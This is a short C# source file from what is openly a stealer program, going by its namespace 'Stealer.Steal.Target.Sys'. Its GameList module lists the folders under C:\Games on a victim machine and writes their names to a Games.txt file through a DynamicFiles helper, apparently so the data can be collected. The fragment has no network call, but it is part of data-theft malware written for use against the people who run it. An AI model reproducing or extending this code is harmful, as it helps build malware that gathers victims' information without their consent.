using System.Collections.Generic;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Sys;

internal class GameList
{
	public static void Start()
	{
		string path = "C:\\Games";
		if (Directory.Exists(path))
		{
			List<string> list = new List<string>();
			string[] directories = Directory.GetDirectories(path);
			foreach (string path2 in directories)
			{
				list.Add(Path.GetFileName(path2));
			}
			DynamicFiles.WriteAllText("Games.txt", string.Join("\n", (IEnumerable<string?>)list.ToArray()));
		}
	}
}
